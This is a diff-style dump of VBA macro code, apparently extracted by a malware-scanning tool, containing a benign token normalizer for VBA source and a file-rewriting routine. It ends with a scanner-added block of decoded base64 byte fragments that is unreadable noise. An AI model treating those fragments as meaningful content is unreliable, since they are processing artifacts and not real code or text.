+'             - VTK_UNEXPECTED_ERROR
+' Notes     : This code is based on code generated by Klemen's LEX4VB. Get LEX4VB from http://www.schmidks.de
+'---------------------------------------------------------------------------------------
+'
+Public Function vtkNormalizeString(s As String, listOfTokens() As String) As String
+
+Dim token As String
+Dim State As Integer, OldState As Integer
+Dim Cnt As Integer
+Dim ch As String
+Dim p As Integer
+
+Dim returnString As String
+
+On Error GoTo vtkNormalizeString_Error
+p = 1: State = 0: OldState = -1
+s = s & Chr(0)
+    
+Do While p <= Len(s)
+    If State = OldState Then Cnt = Cnt + 1 Else Cnt = 0
+    OldState = State
+    ch = Mid(s, p, 1)
+        Select Case State
+            Case 0:
+                ' The analyser is looking for a token : copy characters without modifying
+                If Asc(ch) = 0 Then
+                    State = 9
+                ElseIf ch Like "[A-Za-z]" Then
+                    token = token & ch
+                    State = 1
+                ElseIf ch Like "[']" Then
+                    returnString = returnString & ch
+                    token = ""
+                    State = 2
+                ElseIf ch Like "[""]" Then
+                    returnString = returnString & ch
+                    token = ""
+                    State = 3
+                ElseIf ch Like "[!']" Then
+                    returnString = returnString & ch
+                    token = ""
+                    State = 0
+                Else: Err.Raise VTK_UNEXPECTED_CHAR
+                End If
+
+            Case 1:
+                ' The analsyer is in a token : normalize tokens it finds
+                If Asc(ch) = 0 Then
+                    returnString = returnString & vtkNormalizeToken(token, listOfTokens)
+                    State = 9
+                ElseIf ch Like "[A-Za-z,0-9,_]" Then
+                    token = token & ch
+                    State = 1
+                ElseIf ch Like "[']" Then
+                    returnString = returnString & vtkNormalizeToken(token, listOfTokens) & ch
+                    token = ""
+                    State = 2
+                ElseIf ch Like "[""]" Then
+                    returnString = returnString & vtkNormalizeToken(token, listOfTokens) & ch
+                    token = ""
+                    State = 3
+                ElseIf ch Like "[!']" Then
+                    returnString = returnString & vtkNormalizeToken(token, listOfTokens) & ch
+                    token = ""
+                    State = 0
+                Else: Err.Raise VTK_UNEXPECTED_CHAR
+                End If
+
+
+            Case 2:
+                ' The analyser is in a comment : copy characters without modifying until end of String
+                If Asc(ch) = 0 Then
+                    State = 9
+                ElseIf Asc(ch) > 0 Then
+                    returnString = returnString & ch
+                    State = 2
+                Else: Err.Raise VTK_UNEXPECTED_CHAR
+                End If
+                
+            Case 3:
+                'The analyser is in a String : copy characters without modifying until a quote
+                If Asc(ch) = 0 Then
+                    State = 9
+                ElseIf ch Like "[""]" Then
+                    returnString = returnString & ch
+                    State = 0
+                ElseIf Asc(ch) > 0 Then
+                    returnString = returnString & ch
+                    State = 3
+                Else: Err.Raise VTK_UNEXPECTED_CHAR
+                End If
+                    
+
+            Case 9:
+                If True Then
+                    State = 9
+                Else: Err.Raise VTK_UNEXPECTED_CHAR
+                End If
+
+        End Select
+
+p = p + 1
+Loop
+
+If State <> 9 Then Err.Raise VTK_UNEXPECTED_EOS
+
+vtkNormalizeString = returnString
+Exit Function
+
+vtkNormalizeString_Error:
+    
+    Err.Source = "function vtkNormalizeString of module vtkNormalize"
+    
+    Select Case Err.Number
+        Case VTK_UNEXPECTED_EOS
+            Err.Description = "Unexpected EOS in String " & s
+        Case VTK_UNEXPECTED_CHAR
+            Err.Description = "Unexpected character of Ascii code " & Asc(ch) & " in String " & s & " at position " & p
+        Case Else
+            Err.Number = VTK_UNEXPECTED_ERROR
+    End Select
+    
+    Err.Raise Err.Number, Err.Source, Err.Description
+    
+End Function
+
+
+'---------------------------------------------------------------------------------------
+' Procedure : vtkNormalizeFile
+' Author    : Lucas Vitorino
+' Purpose   : Normalize a file.
+'               - Create a temporary file in the same directory
+'               - Copy each line of the original file in the temporary file, after calling vtkNormalizeString on them
+'               - Delete the original file
+'               - Rename the temporary file with the name of the original one.
+' Raises    : - VTK_WRONG_FILE_PATH
+'             - VTK_UNEXPECTED_ERROR
+'---------------------------------------------------------------------------------------
+'
+Public Sub vtkNormalizeFile(fullFilePath As String, listOfTokens() As String)
+
+On Error GoTo vtkNormalizeFile_Error
+
+    Dim fso As New FileSystemObject
+    
+    ' Initialize input and output files
+    Dim inputFileObject As File
+    Set inputFileObject = fso.GetFile(fullFilePath)
+    
+    Dim normalizedFullFilePath As String
+    normalizedFullFilePath = inputFileObject.ParentFolder & "\" & "tmp_" & inputFileObject.name
+    fso.CreateTextFile (normalizedFullFilePath)
+    Dim outputFileObject As File
+    Set outputFileObject = fso.GetFile(normalizedFullFilePath)
+    
+    ' Initialize objects to read and write the files
+    Dim textFileRead As TextStream
+    Set textFileRead = fso.OpenTextFile(fullFilePath, ForReading)
+    Dim textFileWrite As TextStream
+    Set textFileWrite = fso.OpenTextFile(normalizedFullFilePath, ForWriting)
+    
+    ' Copy each line of the input file in the output file after normalizing it
+    Do Until textFileRead.AtEndOfStream
+        textFileWrite.WriteLine (vtkNormalizeString(textFileRead.ReadLine, listOfTokens))
+    Loop
+    
+    ' Close the streams
+    textFileRead.Close
+    textFileWrite.Close
+    
+    ' Delete original file
+    Kill fullFilePath
+    
+    ' Rename normalized file with the name of the original file
+    outputFileObject.name = fso.GetFileName(fullFilePath)
+    
+   On Error GoTo 0
+   
+   Exit Sub
+
+vtkNormalizeFile_Error:
+
+    Err.Source = "sub vtkNormalizeFile of module vtkNormalize"
+    
+    Select Case Err.Number
+        Case 53
+            Err.Number = VTK_WRONG_FILE_PATH
+        Case Else
+            Err.Number = VTK_UNEXPECTED_ERROR
+    End Select
+    
+    Err.Raise Err.Number, Err.Source, Err.Description
+    
+    Exit Sub
+    
+End Sub
+
+
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+' InQuest injected base64 decoded content
+' +bjX
+' Aaq0a
+' qt`a
+' ILSC
+' ,T(|
+' L\ML
+' L\(0)`
+' \D@|X<\
+' EH@88`(
+' +bjX
+' x*'~(.
+' *'~(.
+
+INQUEST-PP=macro
